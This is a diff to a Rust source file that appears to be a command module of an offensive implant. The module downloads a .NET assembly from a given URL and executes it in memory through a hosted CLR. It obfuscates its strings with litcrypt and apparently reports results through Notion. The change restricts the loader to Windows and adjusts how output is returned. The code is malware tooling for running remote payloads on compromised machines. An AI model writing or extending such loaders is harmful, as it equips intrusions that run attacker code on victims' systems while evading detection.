@@ -2,21 +2,13 @@ use std::error::Error;
 use litcrypt::lc;
 use crate::cmd::{CommandArgs, notion_out};
 use crate::logger::{Logger, log_out};
-use clroxide::{
-    clr::{Clr, ClrContext},
-    primitives::{
-        ICLRMetaHost,
-        GUID,
-        HRESULT
-    }
-};
-use std::ffi::c_void;
-use std::mem::transmute;
-use reqwest::{get, StatusCode};
+#[cfg(windows)] use clroxide::clr::Clr;
+#[cfg(windows)] use reqwest::{get, StatusCode};
 
 ///
 /// Executes .NET assembly in memory given a URL to the assembly and a set of arguments
 /// 
+#[cfg(windows)]
 pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger)-> Result<String, Box<dyn Error>> {
     
     // Parse args
@@ -38,8 +30,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger)-> Result<String
                             // Return Output
                             logger.debug(log_out!("CLR Created"));
                             let res: String = clr.run().unwrap();
-                            dbg!("{:?}", res);
-                            return notion_out!(res);
+                            return Ok(res);
                         }
                     }
                 } else {
@@ -57,4 +48,9 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger)-> Result<String
     }
 
     notion_out!("Assembly Executed!")
+}
+
+#[cfg(not(windows))]
+pub async fn handle(_cmd_args: &mut CommandArgs, _logger: &Logger)-> Result<String, Box<dyn Error>> {
+    notion_out!("Only available on Windows!")
 }
